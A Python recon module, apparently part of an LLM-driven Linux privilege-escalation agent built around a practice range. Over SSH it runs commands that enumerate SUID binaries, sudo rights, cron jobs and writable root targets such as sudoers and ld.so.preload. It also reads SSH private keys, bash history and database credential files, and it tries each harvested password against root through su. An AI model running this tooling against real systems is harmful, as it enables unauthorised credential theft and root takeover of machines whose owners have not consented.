"""RECON：确定性信息收集脚本（零 LLM）。

命令集来自 531 靶场实战沉淀（md 经验文档），覆盖 8 类提权向量：
基线 / SUID / Sudo / Capabilities / Cron / 可写文件 / 凭据 / 环境信号。
输出结构化 JSON，作为 Planner 构图（PLANNING-1）的唯一输入。

注意：不做任何预过滤/截断——完整原始数据交给下游 LLM 自行判断
（哪些是系统标准 SUID 由 Planner/Exploit 的经验规则判断，代码不过滤）。
"""
import re

from container_recon import run_container_recon
from recon_vectors import run_vector_recon

RECON_COMMANDS = [
    ("baseline", "id; groups; uname -a; cat /etc/os-release 2>/dev/null"),
    ("suid", "timeout 30 find / -xdev -perm -4000 -type f "
             "-printf 'SUID %m %u %g %p\\n' 2>/dev/null"),
    ("sgid", "timeout 30 find / -xdev -perm -2000 -type f "
             "-printf 'SGID %m %u %g %p\\n' 2>/dev/null"),
    ("sudo", "sudo -l 2>&1"),
    ("caps", "(getcap -r / 2>/dev/null; /usr/sbin/getcap -r / 2>/dev/null) | sort -u"),
    ("cron", "cat /etc/crontab 2>/dev/null; ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/ 2>/dev/null; crontab -l 2>&1"),
    ("writable", "timeout 30 find / -xdev -writable -type f 2>/dev/null | "
                 "grep -vE '^/proc|^/sys|^/dev|/tmp/pe_' ; "
                 "ls -la /etc/passwd /etc/shadow 2>/dev/null"),
    ("creds", "ls -la /home/$(whoami)/ /root/ 2>/dev/null; cat /home/$(whoami)/*.txt 2>/dev/null; cat /home/$(whoami)/.bash_history 2>/dev/null; cat /home/$(whoami)/.my.cnf /etc/mysql/debian.cnf 2>/dev/null; ls -la /home/$(whoami)/.ssh/ 2>/dev/null; cat /home/$(whoami)/.ssh/id_* 2>/dev/null"),
    ("env", "env; ls -la /var/run/docker.sock 2>/dev/null; ls -la /etc/systemd/system/*.service 2>/dev/null; cat /etc/exports 2>/dev/null"),
    # --- root 文件写原语的落点（实测新增） ---
    # 一个能写任意 root 文件的 SUID/sudo 原语可以选很多落点。命令先把
    # 每个落点的可写性、PAM 模块是否存在、ld.so 配置现状一次问出来，
    # 让 planner 不必再猜。
    ("write_sinks", (
        "for f in /etc/passwd /etc/shadow /etc/group /etc/sudoers "
        "/etc/pam.d/su /etc/pam.d/common-auth /etc/ld.so.preload "
        "/etc/ld.so.conf /etc/cron.d /etc/systemd/system "
        "/root/.ssh/authorized_keys /etc/ssh/sshd_config; do "
        "if [ -e \"$f\" ]; then "
        "[ -w \"$f\" ] && echo \"WRITABLE $f\" || echo \"READONLY $f\"; "
        "else echo \"ABSENT $f\"; fi; done; "
        "echo '--- pam modules ---'; "
        "ls /lib/x86_64-linux-gnu/security/pam_permit.so "
        "/lib/security/pam_permit.so 2>/dev/null; "
        "echo '--- root-executed paths ---'; "
        "grep -rhoE '/[A-Za-z0-9_./-]+' /etc/crontab /etc/cron.d/* "
        "/var/spool/cron/crontabs/* 2>/dev/null | sort -u | "
        "while read -r p; do [ -f \"$p\" ] && [ -w \"$p\" ] && "
        "echo \"WRITABLE_ROOT_TARGET $p\"; done"
    )),
    # --- 凭据复用：配置里的口令直接拿去试 root ---
    # 单独一条命令，避免把凭据当“数据库专用口令”而漏掉复用。
    ("credential_reuse", (
        "for f in /home/*/.my.cnf /root/.my.cnf /etc/mysql/debian.cnf "
        "/etc/mysql/conf.d/*.cnf /home/*/.pgpass /home/*/.netrc "
        "/home/*/.env /opt/*/.env /var/www/*/.env; do "
        "[ -r \"$f\" ] || continue; "
        "grep -hiE '^(password|passwd|pass)\\s*=' \"$f\" 2>/dev/null | "
        "while IFS='=' read -r _ v; do "
        "v=$(printf '%s' \"$v\" | tr -d ' \\\"\\047'); "
        "[ -n \"$v\" ] || continue; "
        "if echo \"$v\" | timeout 3 su -c true root 2>/dev/null; then "
        "echo \"ROOT_PASSWORD_MATCH $f\"; fi; "
        "done; done"
    )),
]


def run_recon(ssh, timeout=120) -> dict:
    """执行全部信息收集命令 → 结构化 JSON（完整不截断）。"""
    raw = {}
    for name, cmd in RECON_COMMANDS:
        code, out, err = ssh.exec(cmd, timeout=timeout, pty=False)
        raw[name] = (out + ("\n[stderr] " + err if err.strip() else "")).strip()

    container = run_container_recon(ssh)
    vectors = run_vector_recon(ssh)
    report = {
        "raw": raw,                       # 原始输出全量保留
        "baseline": _parse_baseline(raw["baseline"]),
        "suid_candidates": _parse_suid(raw["suid"]),   # 全部 SUID，不过滤
        "sgid_candidates": _parse_sgid(raw["sgid"]),   # SGID 单列，不混入 SUID
        "sudo_entries": _parse_sudo(raw["sudo"]),
        "caps": _parse_caps(raw["caps"]),
        "cron": raw["cron"],
        "writable": raw["writable"],
        "creds": raw["creds"],
        "env": raw["env"],
        "container": container,
        "vectors": vectors,
    }
    return report


def _parse_baseline(text):
    uid = groups = kernel = None
    m = re.search(r"uid=(\d+)", text)
    if m:
        uid = int(m.group(1))
    m = re.search(r"groups=(\S+)", text)
    if m:
        groups = m.group(1).split(",")
    m = re.search(r"Linux version (\S+)", text)
    if m:
        kernel = m.group(1)
    return {"uid": uid, "groups": groups, "kernel": kernel,
            "is_root": uid == 0,
            "docker_group": any(
                g.startswith("docker") or g.endswith("(docker)")
                for g in (groups or []))}


def _parse_suid(text):
    """提取全部 SUID 路径（不做白名单过滤——过滤判断交给 LLM）。

    输入行形如 ``SUID 4755 root root /usr/bin/dd`` 或
    ``SGID 2755 root shadow /usr/bin/chage``。只有 SUID 的结果才允许
    进入 suid_candidates——2755 的 SGID 程序（chage/expiry/ssh-agent）
    不提供 root 执行，混进来会稳定制造假阳性。
    """
    paths = []
    for line in text.splitlines():
        line = line.strip()
        if not line:
            continue
        fields = line.split()
        if len(fields) >= 5 and fields[0] == "SUID":
            paths.append(fields[-1])
        elif line.startswith("/"):
            paths.append(line)
    return list(dict.fromkeys(paths))


def _parse_sgid(text):
    """提取 SGID 路径，单独给出，不与 SUID 混用。"""
    paths = []
    for line in text.splitlines():
        line = line.strip()
        if not line:
            continue
        fields = line.split()
        if len(fields) >= 5 and fields[0] == "SGID":
            paths.append(fields[-1])
        elif line.startswith("/"):
            paths.append(line)
    return list(dict.fromkeys(paths))


def _parse_sudo(text):
    entries = []
    for ln in text.splitlines():
        m = re.search(r"NOPASSWD:\s*(.+)", ln)
        if m:
            entries.append(m.group(1).strip())
        elif re.search(r"NOPASSWD.*:\s*ALL\s*$", ln):
            entries.append("ALL")
    return entries


def _parse_caps(text):
    caps = []
    for ln in text.splitlines():
        ln = ln.strip()
        if ln and "cap_" in ln:
            caps.append(ln)
    return caps
